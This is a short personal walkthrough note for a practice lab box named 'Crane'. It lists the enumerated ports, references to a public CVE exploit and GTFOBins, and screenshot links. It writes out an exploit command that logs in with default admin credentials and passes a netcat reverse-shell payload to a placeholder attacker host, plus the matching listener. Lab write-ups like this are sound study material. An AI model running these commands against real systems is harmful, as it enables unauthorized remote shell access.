# Crane

Sanitized practice-box notes. Folder layout matches the Obsidian template: **General Info → External (per port) → Exploit → Internal / Priv Esc → Loot**, with **Evidence** next to the phase where the screenshot was taken.

| | |
| --- | --- |
| OS (guess from ports) | Linux |
| Notes | Personal walkthrough, not a spoiler-free writeup |

## Layout

- [General Info](General-Info.md)
- [Exploit](Exploit.md)
- [Loot](Loot.md)
- [External](External/) — per-port enumeration
- [Internal / Priv Esc](Internal/Priv-Esc.md)

### Ports touched

- `22-ssh`
- `3306-MYSQL`
- `80-http`

## Attack notes

python3 exploit.py -h http://TARGET -u admin -p admin -P "nc ATTACKER 80 -e /bin/bash"

### Commands used

```bash
python3 exploit.py -h http://TARGET -u admin -p admin -P "nc ATTACKER 80 -e /bin/bash"
nc -nlvp 80
```


### References

- https://github.com/manuelz120/CVE-2022-23940
- https://gtfobins.github.io/gtfobins/service/#sudo

## Evidence

![Pasted image 20241014100556.png](Evidence/Pasted%20image%2020241014100556.png)

![Pasted image 20241014102627.png](Internal/Evidence/Pasted%20image%2020241014102627.png)

![Pasted image 20241014102509.png](Internal/Evidence/Pasted%20image%2020241014102509.png)

![Pasted image 20241014100904.png](Internal/Evidence/Pasted%20image%2020241014100904.png)

![Pasted image 20241014100855.png](Internal/Evidence/Pasted%20image%2020241014100855.png)

![Pasted image 20241014095016.png](External/Evidence/Pasted%20image%2020241014095016.png)

![Pasted image 20241014094949.png](External/Evidence/Pasted%20image%2020241014094949.png)

![Pasted image 20241014095522.png](External/Evidence/Pasted%20image%2020241014095522.png)

![Pasted image 20241014095445.png](External/Evidence/Pasted%20image%2020241014095445.png)

![Pasted image 20241014094934.png](External/Evidence/Pasted%20image%2020241014094934.png)

![Pasted image 20241014094129.png](External/Evidence/Pasted%20image%2020241014094129.png)
